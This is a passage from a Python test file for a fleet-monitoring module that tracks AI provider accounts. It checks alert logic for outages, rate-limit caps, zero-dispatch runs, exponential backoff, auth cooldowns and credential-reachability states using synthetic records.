    masked = outage + [rec("anthropic", "acct01", CLASS_AUTH, dt=140),
                       rec("anthropic", "acct04", SUCCESS, dt=150)]
    chk("outage: an uninvolved account's success does NOT mask the outage",
        fires(classify_records(masked, {}, now + 200), "provider-outage", "anthropic"), True)
    # fleet threshold (review defect #2): failing accounts are compared to the ENABLED fleet —
    # 2 bad accounts in a 6-account catalog fleet stay quiet; a majority (3 of 6) pages.
    big_fleet = {"anthropic": {account_hash(f"acct{i:02d}", salt) for i in range(1, 7)}}
    two_bad = [rec("anthropic", "acct01", CLASS_AUTH, dt=0),
               rec("anthropic", "acct02", CLASS_AUTH, dt=30),
               rec("anthropic", "acct01", CLASS_AUTH, dt=60),
               rec("anthropic", "acct02", CLASS_AUTH, dt=90)]
    chk("outage DO-NOTHING (2 bad accounts of an enabled fleet of 6)",
        fires(classify_records(two_bad, big_fleet, now + 200), "provider-outage", "anthropic"),
        False)
    three_bad = two_bad + [rec("anthropic", "acct03", CLASS_AUTH, dt=120)]
    chk("outage ACT (failing majority 3 of enabled fleet of 6)",
        fires(classify_records(three_bad, big_fleet, now + 200), "provider-outage", "anthropic"),
        True)
    chk("outage account floor is max(2, ceil(fleet/2))",
        [_outage_required_accounts(n) for n in (0, 1, 2, 3, 4, 6, 7)], [2, 2, 2, 2, 2, 3, 4])
    # unknown-class exclusion (review defect #4): unattributable failures never page an outage...
    unknown_fails = [rec("anthropic", "acct01", "other", dt=0),
                     rec("anthropic", "acct02", "unknown", dt=30),
                     rec("anthropic", "acct03", "weird-novel", dt=60)]
    chk("outage DO-NOTHING (unknown class never pages an outage)",
        fires(classify_records(unknown_fails, {}, now + 100), "provider-outage", "anthropic"),
        False)
    # ...but DO count toward the persistence burst (transient-for-persistence)
    unknown_burst = [rec("anthropic", "acct01", "unknown", dt=i * 30) for i in range(5)]
    chk("unknown counts toward persistent-transient",
        fires(classify_records(unknown_burst, {}, now + 200), "persistent-transient", "anthropic"),
        True)
    # ...yet an unknown burst must NOT be sold as self-induced rate limiting (review #72
    # finding 2): composition rides the action, and a green status page renders the
    # unverified framing end-to-end — never SELF-INDUCED / shed-parallelism.
    ub_acts = annotate_provider_status(classify_records(unknown_burst, {}, now + 200),
                                       probe=lambda p: (STATUS_OPERATIONAL, "none"))
    ub = next(a for a in ub_acts if a["condition"] == "persistent-transient")
    chk("burst action carries its failure-class composition",
        ub["class_counts"], {CLASS_TRANSIENT: 0, CLASS_UNKNOWN: 5})
    chk("burst reason discloses the composition", "5 unknown" in ub["reason"], True)
    ub_body = render_body(ub, "m")
    chk("green-status unknown burst renders UNVERIFIED end-to-end (never SELF-INDUCED)",
        ("SELF-INDUCED" in ub_body, "cause UNVERIFIED" in ub_body), (False, True))
    # too-old failures fall outside the 30-min window
    stale = [rec("anthropic", "acct01", CLASS_AUTH, dt=-4000),
             rec("anthropic", "acct02", CLASS_AUTH, dt=-3900),
             rec("anthropic", "acct03", CLASS_AUTH, dt=-3800)]
    chk("outage DO-NOTHING (outside window)",
        fires(classify_records(prune(stale, now), {}, now), "provider-outage", "anthropic"), False)

    # ---- PERSISTENT-TRANSIENT: ACT / DO-NOTHING ---------------------------------------------
    burst = [rec("anthropic", "acct01", CLASS_TRANSIENT, dt=i * 30) for i in range(5)]
    chk("transient ACT (5 in 15m)",
        fires(classify_records(burst, {}, now + 200), "persistent-transient", "anthropic"), True)
    blip = [rec("anthropic", "acct01", CLASS_TRANSIENT, dt=i * 30) for i in range(2)]
    chk("transient DO-NOTHING (blip of 2)",
        fires(classify_records(blip, {}, now + 100), "persistent-transient", "anthropic"), False)
    # flip: a later success clears it
    burst_ok = burst + [rec("anthropic", "acct01", SUCCESS, dt=200)]
    chk("transient RECOVERS on success",
        fires(classify_records(burst_ok, {}, now + 300), "persistent-transient", "anthropic"), False)
    # a TRUE-transient burst keeps the self-induced diagnosis end-to-end (mutation guard for
    # review #72 finding 2: dropping the class_counts attachment turns this red).
    tb_acts = annotate_provider_status(classify_records(burst, {}, now + 200),
                                       probe=lambda p: (STATUS_OPERATIONAL, "none"))
    tb = next(a for a in tb_acts if a["condition"] == "persistent-transient")
    chk("pure transient burst carries its composition",
        tb["class_counts"], {CLASS_TRANSIENT: 5, CLASS_UNKNOWN: 0})
    chk("green-status TRUE-transient burst still renders SELF-INDUCED end-to-end",
        "SELF-INDUCED" in render_body(tb, "m"), True)

    # ---- PROVIDER-CAPPED: ACT (all capped) / DO-NOTHING (one capped) -------------------------
    fleet = {"anthropic": {account_hash("acct01", salt), account_hash("acct02", salt)}}
    all_capped = [rec("anthropic", "acct01", CLASS_LIMIT, reset="14:00"),
                  rec("anthropic", "acct02", CLASS_LIMIT, dt=60, reset="15:00")]
    acts = classify_records(all_capped, fleet, now + 100)
    chk("capped ACT (all enabled capped)", fires(acts, "provider-capped", "anthropic"), True)
    chk("capped surfaces earliest reset",
        next(a["reset_hint"] for a in acts
             if a["condition"] == "provider-capped"), "14:00")
    one_capped = [rec("anthropic", "acct01", CLASS_LIMIT, reset="14:00")]
    chk("capped DO-NOTHING (1/2 capped = churn)",
        fires(classify_records(one_capped, fleet, now + 100), "provider-capped", "anthropic"), False)
    # flip: a success on a capped account clears the cap alert
    capped_ok = all_capped + [rec("anthropic", "acct01", SUCCESS, dt=120)]
    chk("capped RECOVERS on success",
        fires(classify_records(capped_ok, fleet, now + 200), "provider-capped", "anthropic"), False)
    # STALE-CAP invalidation (review defect #1): a limit record is voided by any LATER success
    # from the SAME account — `A limit -> A success -> B limit` caps only B...
    stale_cap = [rec("anthropic", "acct01", CLASS_LIMIT, dt=0, reset="14:00"),
                 rec("anthropic", "acct01", SUCCESS, dt=60),
                 rec("anthropic", "acct02", CLASS_LIMIT, dt=120, reset="15:00")]
    chk("capped DO-NOTHING (later same-account success invalidates the stale cap)",
        fires(classify_records(stale_cap, fleet, now + 200), "provider-capped", "anthropic"),
        False)
    # ...and a limit AFTER that success re-caps the account (ordering by record time)
    recap = stale_cap + [rec("anthropic", "acct01", CLASS_LIMIT, dt=180, reset="16:00")]
    chk("capped ACT (re-capped after its own success)",
        fires(classify_records(recap, fleet, now + 300), "provider-capped", "anthropic"), True)
    # no fleet knowledge -> provider-capped path is simply absent (no false alert)
    chk("capped absent without fleet map",
        any(a["condition"] == "provider-capped" for a in classify_records(all_capped, {}, now + 100)),
        False)

    # ---- ZERO-DISPATCH: ACT (3 consecutive) / DO-NOTHING (2) / flip -------------------------
    zd = [make_record("fleet", account_hash("z", salt), "", CLASS_ZERO_DISPATCH, str(i), now + i * 60)
          for i in range(3)]
    chk("zero-dispatch ACT (3 ticks)", fires(classify_records(zd, {}, now + 300),
                                             "zero-dispatch", "fleet"), True)
    chk("zero-dispatch DO-NOTHING (2 ticks)",
        fires(classify_records(zd[:2], {}, now + 200), "zero-dispatch", "fleet"), False)
    # RESET (review defect #5): a dispatch-success record between zero ticks breaks the
    # consecutive run, so 2+2 zero ticks around a productive tick do NOT page...
    def zrec(cls, dt, run="r"):
        return make_record("fleet", account_hash("z", salt), "", cls, run, now + dt)
    zd_reset = (zd[:2] + [zrec(SUCCESS, 150)]
                + [zrec(CLASS_ZERO_DISPATCH, 200 + i * 60, str(9 + i)) for i in range(2)])
    chk("zero-dispatch RESETS on a dispatch-success record",
        fires(classify_records(zd_reset, {}, now + 400), "zero-dispatch", "fleet"), False)
    # ...and a dispatch-success AFTER a firing run recovers (closes) the alert
    zd_ok = zd + [zrec(SUCCESS, 400)]
    chk("zero-dispatch RECOVERS on a dispatch-success record",
        fires(classify_records(zd_ok, {}, now + 500), "zero-dispatch", "fleet"), False)
    # a claim-abort tick counts toward the consecutive run (review defect #6)
    zd_abort = zd[:2] + [zrec("claim-abort", 200)]
    chk("zero-dispatch ACT (claim-abort completes the run)",
        fires(classify_records(zd_abort, {}, now + 300), "zero-dispatch", "fleet"), True)

    # ---- [#341] the EMPTY-FRONTIER (`idle`) tick: a boundary, so recovery cannot flap -----------
    # (i) RECOVERY. A firing run followed by one empty-frontier tick recovers immediately, because
    #     "launched nothing WHILE WORK WAS READY" stops being true the moment the frontier empties.
    #     Before #341 this window fired for up to WINDOW_HOURS (the run's records are all still
    #     here — only their staleness changed).
    zd_idle = zd + [zrec(CLASS_IDLE, 400)]
    chk("zero-dispatch RECOVERS on an empty-frontier (idle) tick",
        fires(classify_records(zd_idle, {}, now + 500), "zero-dispatch", "fleet"), False)
    chk("the idle recovery says WHY it recovered (empty frontier, not 'placing work again')",
        _action(classify_records(zd_idle, {}, now + 500), "zero-dispatch", "fleet")["reason"],
        "the ready frontier is empty — there is no work to launch")
    # (ii) NO FLAPPING, the half that makes (i) safe. `idle` BREAKS the run, so the recovered
    #      window above does NOT reopen on the first zero-dispatch tick after it: the three
    #      pre-idle records are behind the boundary and only ONE failing tick has been observed
    #      since the frontier was seen empty. Skipping `idle` in the reverse scan (`continue`
    #      instead of `break`) leaves a 4-long tail here and flips this red.
    zd_reentry = zd_idle + [zrec(CLASS_ZERO_DISPATCH, 460, "i9")]
    chk("zero-dispatch does NOT reopen on the first zero tick after an idle boundary",
        fires(classify_records(zd_reentry, {}, now + 500), "zero-dispatch", "fleet"), False)
    # ...and the threshold is genuinely re-armed, not permanently disarmed: ZERO_DISPATCH_MIN
    # fresh failing ticks after the boundary page again.
    zd_rearm = zd_idle + [zrec(CLASS_ZERO_DISPATCH, 460 + i * 60, f"i{i}")
                          for i in range(ZERO_DISPATCH_MIN)]
    chk("zero-dispatch RE-ARMS: a full fresh run after the idle boundary pages again",
        fires(classify_records(zd_rearm, {}, now + 900), "zero-dispatch", "fleet"), True)
    # (iii) the same boundary mid-window: these four ticks hold THREE zero-dispatch ticks, but one
    #       idle tick splits them 1 + 2, so no run reaches the threshold and nothing pages.
    zd_interleaved = [zrec(CLASS_ZERO_DISPATCH, 0, "i0"), zrec(CLASS_IDLE, 60, "i1"),
                      zrec(CLASS_ZERO_DISPATCH, 120, "i2"), zrec(CLASS_ZERO_DISPATCH, 180, "i3")]
    chk("zero-dispatch DO-NOTHING: an interleaved idle tick RESETS the consecutive run",
        fires(classify_records(zd_interleaved, {}, now + 300), "zero-dispatch", "fleet"), False)
    # (iv) a fleet that has only ever been idle pages nothing at all...
    chk("an idle-only fleet window never fires",
        fires(classify_records([zrec(CLASS_IDLE, i * 60, f"q{i}") for i in range(4)], {},
                               now + 300), "zero-dispatch", "fleet"), False)
    # (v) ...and a productive tick AFTER the quiet stretch still breaks the run outright, so the
    #     idle records cannot resurrect a stale run once real dispatch resumes.
    chk("a dispatch-success after an idle stretch still breaks the run",
        fires(classify_records(zd_idle + [zrec(SUCCESS, 460)], {}, now + 500),
              "zero-dispatch", "fleet"), False)

    # ---- ORPHANED OPEN ALERTS (issue #205): a provider that aged out of the window still closes --
    def recovers(actions, condition, provider):
        return any(a["condition"] == condition and a["provider"] == provider and not a["fire"]
                   for a in actions)

    # the acute case: the fleet zero-dispatch alert is open, but every fleet record has aged out of
    # the window (empty-frontier ticks record nothing). With NO open-marker knowledge the old code
    # emitted nothing, so the alert stayed open forever; feeding the open marker yields a recovery.
    chk("orphan zero-dispatch alert with no fleet records is NOT recovered without marker knowledge",
        any(a["provider"] == "fleet" for a in classify_records([], {}, now)), False)
    chk("orphan zero-dispatch alert recovers when its marker is open but the fleet aged out",
        recovers(classify_records([], {}, now, {("zero-dispatch", "fleet")}),
                 "zero-dispatch", "fleet"), True)
    # any provider/condition works, not just the fleet — an aged-out outage alert closes too
    chk("orphan provider-outage alert recovers when the provider aged out",
        recovers(classify_records([], {}, now, {("provider-outage", "anthropic")}),
                 "provider-outage", "anthropic"), True)
    # the recovery is a CLOSE, never a fresh fire
    orphan = classify_records([], {}, now, {("zero-dispatch", "fleet")})
    chk("orphan recovery never fires (close only)", any(a["fire"] for a in orphan), False)
    # a provider STILL in the window is governed by its per-condition logic, not orphan recovery:
    # a firing outage with an open marker stays firing (not force-closed)...
    chk("open marker does NOT force-close a provider still firing in the window",
        fires(classify_records(outage, {"anthropic": set()}, now + 200,
                               {("provider-outage", "anthropic")}), "provider-outage", "anthropic"),
        True)
    # ...and an open provider-capped marker for a provider present in the window but with NO fleet
    # map is left alone (closing on absent side-knowledge would be a false recovery, not health)
    present_no_fleet = classify_records(
        [rec("anthropic", "acct01", CLASS_TRANSIENT, dt=0)], {}, now + 10,
        {("provider-capped", "anthropic")})
    chk("open capped marker for an in-window provider without a fleet map is left untouched",
        any(a["condition"] == "provider-capped" for a in present_no_fleet), False)
    # already-covered markers are not double-emitted (the record-driven action wins)
    covered = classify_records(burst, {}, now + 200, {("persistent-transient", "anthropic")})
    chk("an already-covered open marker is not double-emitted",
        sum(1 for a in covered if a["condition"] == "persistent-transient"), 1)

    # ---- marker parsing (pure) + fail-open enumeration --------------------------------------
    body = (render_body({"condition": "zero-dispatch", "provider": "fleet",
                         "fire": True, "reason": "r"}, "m"))
    chk("parse_alert_markers recovers (condition, provider) from a rendered body",
        parse_alert_markers([body]), {("zero-dispatch", "fleet")})
    chk("parse_alert_markers reads every marker across bodies",
        parse_alert_markers([_marker("provider-outage", "anthropic"),
                             _marker("provider-capped", "openai"), "no marker here"]),
        {("provider-outage", "anthropic"), ("provider-capped", "openai")})
    chk("parse_alert_markers ignores non-string bodies", parse_alert_markers([None, 5, {}]), set())
    ok = _test_open_markers(chk) and ok

    # ---- reactive backoff for probe-exempt providers (decision 2026-07-17, issue #29) --------
    ah = account_hash("codex01", salt)
    # (i) first hit -> BASE (15 min) from the record ts, exponential default (no hint)
    hit1 = [rec("openai", "codex01", "rate-limit", dt=0)]
    b = account_backoffs(hit1, now + 60)
    chk("backoff first hit = base 15 min", b.get(ah, {}).get("backoff_until"),
        now + BACKOFF_BASE_SECONDS)
    chk("backoff first hit consecutive=1", b.get(ah, {}).get("consecutive"), 1)
    # consecutive hits DOUBLE: 15 -> 30 -> 60 min from the LAST hit
    hit3 = [rec("openai", "codex01", "rate-limit", dt=i * 100) for i in range(3)]
    b3 = account_backoffs(hit3, now + 300)
    chk("backoff doubles per consecutive hit (3rd = 60 min)",
        b3.get(ah, {}).get("backoff_until"), now + 200 + 4 * BACKOFF_BASE_SECONDS)
    chk("backoff tracks consecutive count", b3.get(ah, {}).get("consecutive"), 3)
    # exponential growth is CAPPED at 5 h
    hitmany = [rec("openai", "codex01", "rate-limit", dt=i * 10) for i in range(12)]
    bmany = account_backoffs(hitmany, now + 200)
    chk("backoff exponential capped at 5 h",
        bmany.get(ah, {}).get("backoff_until"), now + 110 + BACKOFF_CAP_SECONDS)
    # (iii) a SUCCESS resets the multiplier: hit, success, hit -> base again
    reset_run = [rec("openai", "codex01", "rate-limit", dt=0),
                 rec("openai", "codex01", SUCCESS, dt=100),
                 rec("openai", "codex01", "rate-limit", dt=200)]
    br = account_backoffs(reset_run, now + 300)
    chk("success resets the multiplier (next hit = base)",
        (br.get(ah, {}).get("backoff_until"), br.get(ah, {}).get("consecutive")),
        (now + 200 + BACKOFF_BASE_SECONDS, 1))
    chk("success alone clears the backoff",
        account_backoffs([rec("openai", "codex01", "rate-limit", dt=0),
                          rec("openai", "codex01", SUCCESS, dt=100)], now + 200), {})
    # expired backoffs are filtered out entirely
    chk("expired backoff absent from the map",
        account_backoffs(hit1, now + BACKOFF_BASE_SECONDS + 1), {})
    # session-limit (limit class) also backs off; auth/setup/unknown neither extend nor clear
    bl = account_backoffs([rec("openai", "codex01", "session-limit", dt=0),
                           rec("openai", "codex01", CLASS_AUTH, dt=50)], now + 100)
    chk("limit class backs off; auth does not clear it",
        (bl.get(ah, {}).get("last_signal"), bl.get(ah, {}).get("consecutive")), (CLASS_LIMIT, 1))
    # #500: repeated clean exits with no edit become account-side only across task boundaries.
    # The newest qualifying observation is the ONE derived limit signal fed to this existing
    # backoff walk; the raw records remain no_change in the ledger.
    nc_distinct = [rec("openai", "codex01", CLASS_NO_CHANGE, dt=i * 60,
                       issue=20 + i, input_tokens=300000 + i, output_tokens=1000,
                       wall_seconds=70) for i in range(3)]
    ncb = account_backoffs(nc_distinct, now + 180).get(ah, {})
    chk("3 no_change records on 3 issues back off the account (#500 tripwire)",
        (ncb.get("last_signal"), ncb.get("last_ts"), ncb.get("backoff_until")),
        (CLASS_LIMIT, now + 120, now + 120 + BACKOFF_BASE_SECONDS))
    chk("derived no_change limit reaches normal provider classification",
        fires(classify_records(nc_distinct, {"openai": {ah}}, now + 180),
              "provider-capped", "openai"), True)
    nc_same_issue = [rec("openai", "codex01", CLASS_NO_CHANGE, dt=i * 60,
                         issue=20, input_tokens=300000, output_tokens=1000,
                         wall_seconds=70) for i in range(3)]
    chk("3 no_change records on the SAME issue do not back off (#500 tripwire)",
        account_backoffs(nc_same_issue, now + 180), {})
    nc_two = [rec("openai", "codex01", CLASS_NO_CHANGE, dt=i * 60,
                  issue=20 + i, input_tokens=300000, output_tokens=1000,
                  wall_seconds=70) for i in range(2)]
    chk("2 no_change records on distinct issues do not back off (#500 tripwire)",
        account_backoffs(nc_two, now + 180), {})
    nc_two_issues = [rec("openai", "codex01", CLASS_NO_CHANGE, dt=i * 60,
                         issue=(20, 20, 21)[i]) for i in range(3)]
    chk("3 no_change records across the required 2 issues do back off",
        account_backoffs(nc_two_issues, now + 180).get(ah, {}).get("last_signal"), CLASS_LIMIT)
    # provider reset hint (machine-safe forms) overrides the exponential default…
    bh = account_backoffs([rec("openai", "codex01", "rate-limit", dt=0, reset="try again in 120 s")],
                          now + 10)
    chk("parseable reset hint wins", bh.get(ah, {}).get("backoff_until"), now + 120)
    # …but (v) a forged/absurd hint is CLAMPED to the 5 h cap, and garbage falls back cleanly
    bf = account_backoffs([rec("openai", "codex01", "rate-limit", dt=0,
                               reset="in 999999 hours")], now + 10)
    chk("forged huge hint clamped to cap", bf.get(ah, {}).get("backoff_until"),
        now + BACKOFF_CAP_SECONDS)
    bg = account_backoffs([rec("openai", "codex01", "rate-limit", dt=0,
                               reset="resets 2pm (Europe/London)")], now + 10)
    chk("free-text hint falls back to exponential (no crash)",
        bg.get(ah, {}).get("backoff_until"), now + BACKOFF_BASE_SECONDS)
    # malformed records are skipped, never crash the sweep
    chk("malformed records skipped fail-open",
        account_backoffs([{"account": None, "exit_class": "rate-limit", "ts": now},
                          {"weird": True}, "not-a-dict",
                          {"account": ah, "exit_class": "rate-limit", "ts": True}], now), {})
    # parse_reset_hint pure forms
    chk("hint: relative minutes", parse_reset_hint("Please try again in 5 minutes", 1000), 1300.0)
    chk("hint: retry after seconds", parse_reset_hint("retry after 90 seconds", 1000), 1090.0)
    # the advertised HTTP unitless form must actually parse (cross-provider review r1):
    # RFC 9110 Retry-After delay-seconds
    chk("hint: unitless retry-after is seconds", parse_reset_hint("retry-after: 120", 1000), 1120.0)
    chk("hint: unitless Retry After variant", parse_reset_hint("Retry After 45", 1000), 1045.0)
    # the SUCCESS-reset / consecutive walk must not depend on caller ordering (r1): shuffled
    # input yields the same state as ts-order (success at ts=100 clears the ts=0 hit; the ts=200
    # hit then restarts at base)
    chk("out-of-order records are ts-sorted before the walk",
        account_backoffs([rec("openai", "codex01", "rate-limit", dt=200),
                          rec("openai", "codex01", SUCCESS, dt=100),
                          rec("openai", "codex01", "rate-limit", dt=0)], now + 300)
        .get(ah, {}).get("consecutive"), 1)
    # non-finite ts records are skipped fail-open, never crash int()
    chk("non-finite ts skipped fail-open",
        account_backoffs([{"account": ah, "exit_class": "rate-limit", "ts": float("inf")},
                          {"account": ah, "exit_class": "rate-limit", "ts": float("nan")}],
                         now), {})
    # future-stamp guard (cross-provider review r2 finding 2): the per-record clamp is relative to
    # the RECORD ts, so a forged now+50h stamp would otherwise back off far past the 5 h ceiling —
    # it must be dropped from the window AND skipped by the backoff walk (fail-open, like the
    # forged-stamp contract everywhere else); a within-skew stamp (runner clock drift) still works.
    chk("prune drops an implausibly-future stamp",
        len(prune([rec("openai", "codex01", "rate-limit", dt=FUTURE_SKEW_SECONDS + 10)], now)), 0)
    chk("prune keeps a within-skew stamp",
        len(prune([rec("openai", "codex01", "rate-limit", dt=60)], now)), 1)
    chk("future-forged stamp skipped fail-open (never a beyond-cap backoff)",
        account_backoffs([{"account": ah, "exit_class": CLASS_TRANSIENT, "ts": now + 180000}],
                         now), {})
    bskew = account_backoffs([{"account": ah, "exit_class": CLASS_TRANSIENT, "ts": now + 60}], now)
    chk("within-skew stamp still backs off (bounded by now + cap)",
        bskew.get(ah, {}).get("backoff_until"), now + 60 + BACKOFF_BASE_SECONDS)
    # the cap binds relative to NOW, not the record ts (cross-provider review r3 finding 1): a
    # record at exactly now + FUTURE_SKEW with a capped hint would otherwise return
    # now + 300 + 18000 — five minutes past the 5 h ceiling
    bcaph = account_backoffs([rec("openai", "codex01", "rate-limit", dt=FUTURE_SKEW_SECONDS,
                                  reset="in 999999 hours")], now)
    chk("within-skew stamp + capped hint ends at now + cap exactly",
        bcaph.get(ah, {}).get("backoff_until"), now + BACKOFF_CAP_SECONDS)
    # same bound on the exponential arm: last hit at now+110, derived at now+50 -> now+50+cap
    bcape = account_backoffs([rec("openai", "codex01", "rate-limit", dt=i * 10)
                              for i in range(12)], now + 50)
    chk("within-skew stamp + capped exponential ends at now + cap exactly",
        bcape.get(ah, {}).get("backoff_until"), now + 50 + BACKOFF_CAP_SECONDS)
    chk("hint: bare epoch", parse_reset_hint("1770000000", 1000), 1770000000.0)
    chk("hint: past epoch rejected", parse_reset_hint("1770000000", 1780000000), None)
    chk("hint: garbage -> None", parse_reset_hint("resets at 2pm", 1000), None)
    chk("hint: empty/None -> None", (parse_reset_hint("", 1000), parse_reset_hint(None, 1000)),
        (None, None))
    # transient (rate-limit) records now KEEP their reset hint (the backoff needs it)
    chk("rate-limit record keeps reset_hint",
        "reset_hint" in rec("openai", "codex01", "rate-limit", reset="in 20s"), True)

    # ---- [registry #596] AUTH COOLDOWN: N consecutive auth outcomes sideline ONE account, BOUNDED,
    # and raise the ops alert exactly once. Reuses the issue-#29 probe-exempt backoff primitive
    # (account_backoffs -> account-usage's backoff_until overlay), NOT a parallel mechanism. ------
    one_auth = [rec("openai", "codex01", "auth", dt=0)]
    chk(f"a SINGLE auth does NOT cool down the account (N={AUTH_COOLDOWN_MIN})",
        auth_cooldowns(one_auth, now + 60), {})
    chk("a single auth leaves account_backoffs untouched too",
        account_backoffs(one_auth, now + 60), {})
    two_auth = [rec("openai", "codex01", "auth", dt=0, run="a1"),
                rec("openai", "codex01", "auth", dt=60, run="a2")]
    cd = auth_cooldowns(two_auth, now + 120)
    chk(f"{AUTH_COOLDOWN_MIN} consecutive auth outcomes cool the account down",
        (cd.get(ah, {}).get("backoff_until"), cd.get(ah, {}).get("last_signal"),
         cd.get(ah, {}).get("consecutive")),
        (now + 60 + AUTH_COOLDOWN_SECONDS, CLASS_AUTH, 2))
    chk("the cooldown surfaces through the SAME account_backoffs primitive the allocator reads",
        account_backoffs(two_auth, now + 120).get(ah, {}).get("last_signal"), CLASS_AUTH)
    # BOUNDED, not a disable: it is one short non-doubling TTL and it EXPIRES on its own — the sole
    # cross-provider reviewer must come back without maintainer action.
    chk("the cooldown EXPIRES (no permanent unavailable flag)",
        (auth_cooldowns(two_auth, now + 60 + AUTH_COOLDOWN_SECONDS + 1),
         account_backoffs(two_auth, now + 60 + AUTH_COOLDOWN_SECONDS + 1)), ({}, {}))
    chk("the cooldown never doubles (a long auth run stays one short TTL)",
        auth_cooldowns([rec("openai", "codex01", "auth", dt=i * 10, run=f"a{i}")
                        for i in range(12)], now + 200).get(ah, {}).get("backoff_until"),
        now + 110 + AUTH_COOLDOWN_SECONDS)
    chk("the cooldown end is clamped to now + AUTH_COOLDOWN_SECONDS even on a skewed stamp",
        auth_cooldowns([{"account": ah, "exit_class": CLASS_AUTH, "ts": now + FUTURE_SKEW_SECONDS,
                         "provider": "openai"},
                        {"account": ah, "exit_class": CLASS_AUTH, "ts": now + FUTURE_SKEW_SECONDS,
                         "provider": "openai"}], now).get(ah, {}).get("backoff_until"),
        now + AUTH_COOLDOWN_SECONDS)
    # A SUCCESS between the auths breaks the run: the interleaved 5-auth/5-success live pattern must
    # not cool the account down on every other run.
    chk("an interleaved success breaks the auth run",
        auth_cooldowns([rec("openai", "codex01", "auth", dt=0, run="a1"),
                        rec("openai", "codex01", SUCCESS, dt=30, run="s1"),
                        rec("openai", "codex01", "auth", dt=60, run="a2")], now + 120), {})
    chk("a later success CLEARS a cooldown already earned",
        auth_cooldowns(two_auth + [rec("openai", "codex01", SUCCESS, dt=90, run="s2")],
                       now + 120), {})
    # Per-ACCOUNT: another account's auth failures never sideline this one.
    other_h = account_hash("codex02", salt)
    two_acct = two_auth + [rec("openai", "codex02", "auth", dt=10, run="b1")]
    chk("the cooldown is per-account (the other account is untouched)",
        sorted(auth_cooldowns(two_acct, now + 120)), sorted([ah]))
    chk("the other account's fingerprint is absent", other_h in auth_cooldowns(two_acct, now + 120),
        False)
    # The auth pass must NOT perturb the limit/transient exponential chain (why it is a separate
    # pass): an interleaved auth record used to be able to inflate `consecutive`.
    mixed_chain = [rec("openai", "codex01", "rate-limit", dt=0, run="r1"),
                   rec("openai", "codex01", "auth", dt=10, run="a1"),
                   rec("openai", "codex01", "rate-limit", dt=20, run="r2")]
    chk("an interleaved auth does not inflate the rate-limit consecutive count",
        account_backoffs(mixed_chain, now + 30).get(ah, {}).get("consecutive"), 2)
    # A LONGER live rate-limit backoff wins over the short cooldown (never shortened).
    long_then_auth = [rec("openai", "codex01", "rate-limit", dt=0, run="r1"),
                      rec("openai", "codex01", "rate-limit", dt=10, run="r2"),
                      rec("openai", "codex01", "rate-limit", dt=20, run="r3"),
                      rec("openai", "codex01", "auth", dt=30, run="a1"),
                      rec("openai", "codex01", "auth", dt=40, run="a2")]
    merged = account_backoffs(long_then_auth, now + 50).get(ah, {})
    chk("a longer live rate-limit backoff is never SHORTENED by the auth cooldown",
        (merged.get("last_signal"), merged.get("backoff_until")),
        (CLASS_TRANSIENT, now + 20 + BACKOFF_BASE_SECONDS * 4))
    # prune must not evict a live cooldown's evidence (the issue-#82 bug, for auth). [#699] The
    # flood is CEILING-scale: since prune gained the 7 h time floor, a live cooldown's records
    # (at most AUTH_COOLDOWN_SECONDS old) are inside the floor and the count cap cannot touch
    # them — only the absolute ceiling can, so that is the regime this guard is exercised in.
    auth_flood = two_auth + ceiling_flood("a", 50, start=100)
    auth_at = now + 400
    auth_window, auth_err = prune_loud(auth_flood, auth_at)
    chk("prune retains a live auth cooldown's evidence (no mid-cooldown readmission)",
        (len(auth_window), len(auth_flood) > RETENTION_CEILING_RECORDS,
         auth_cooldowns(auth_window, auth_at).get(ah, {}).get("last_signal")),
        (RETENTION_CEILING_RECORDS, True, CLASS_AUTH))
    chk("the ceiling eviction that flood caused is SURFACED, never silent",
        "RETENTION CEILING BINDING" in auth_err, True)
    # ---- [registry #639] CREDENTIAL REACHABILITY: the evidence question the probe-exemption seam
    # needs, distinct from the bounded #596 hold. "Exempt from the quota probe" must never imply
    # "reachable", so this predicate must be able to say DEAD — and must never say `live` off
    # anything but a success. --------------------------------------------------------------------
    chk("no records at all -> UNPROVEN (never a reachability claim in either direction)",
        (credential_states([], now), credential_state(credential_states([], now), ah)),
        ({}, CREDENTIAL_UNPROVEN))
    chk("a success PROVES reachability (live)",
        credential_state(credential_states([rec("openai", "codex01", SUCCESS, dt=0)], now + 60), ah),
        CREDENTIAL_LIVE)
    chk(f"a SINGLE auth is inconclusive, not dead (N={CREDENTIAL_DEAD_MIN})",
        credential_state(credential_states(one_auth, now + 60), ah), CREDENTIAL_UNPROVEN)
    # THE behavioural heart of #639: a monotone auth run is a DEAD credential, with no TTL.
    chk(f"{CREDENTIAL_DEAD_MIN} consecutive auth outcomes prove the credential DEAD",
        (credential_state(credential_states(two_auth, now + 120), ah),
         credential_states(two_auth, now + 120)[ah]["consecutive"]),
        (CREDENTIAL_DEAD, 2))
    # ...and unlike the #596 cooldown it does NOT expire on its own: re-admitting a credential that
    # has produced only rejections buys zero verdicts and spends a runner + a lease every tick.
    chk("the dead state does NOT expire with the cooldown TTL (the #596 hold does)",
        (credential_state(credential_states(two_auth, now + 60 + AUTH_COOLDOWN_SECONDS + 1), ah),
         auth_cooldowns(two_auth, now + 60 + AUTH_COOLDOWN_SECONDS + 1)),
        (CREDENTIAL_DEAD, {}))
    # Recovery is automatic and immediate on positive evidence — this is what keeps the predicate
    # compatible with #596's "NOT a disable" decision for the INTERLEAVED pattern it was calibrated
    # on (5 auth against 5 success in one window).
    chk("a later success clears DEAD instantly (interleaved pattern stays live)",
        credential_state(credential_states(
            two_auth + [rec("openai", "codex01", SUCCESS, dt=90, run="s2")], now + 120), ah),
        CREDENTIAL_LIVE)
    chk("an auth AFTER a success drops the live claim without asserting dead",
        credential_state(credential_states(
            [rec("openai", "codex01", SUCCESS, dt=0, run="s1"),
             rec("openai", "codex01", "auth", dt=30, run="a1")], now + 60), ah),
        CREDENTIAL_UNPROVEN)
    # A rate limit says NOTHING about credential validity, in either direction.
    chk("limit/transient records neither prove nor disprove reachability",
        credential_state(credential_states(
            [rec("openai", "codex01", "rate-limit", dt=0, run="r1"),
             rec("openai", "codex01", "rate-limit", dt=10, run="r2")], now + 20), ah),
        CREDENTIAL_UNPROVEN)
    chk("an interleaved rate-limit does not break a dead auth run",
        credential_state(credential_states(
            [rec("openai", "codex01", "auth", dt=0, run="a1"),
             rec("openai", "codex01", "rate-limit", dt=10, run="r1"),
             rec("openai", "codex01", "auth", dt=20, run="a2")], now + 30), ah),
        CREDENTIAL_DEAD)
    chk("dead is PER-ACCOUNT (another account's rejections never condemn this one)",
        credential_state(credential_states(two_acct, now + 120), other_h), CREDENTIAL_UNPROVEN)
    chk("a future-forged auth stamp is skipped fail-open (cannot fabricate DEAD)",
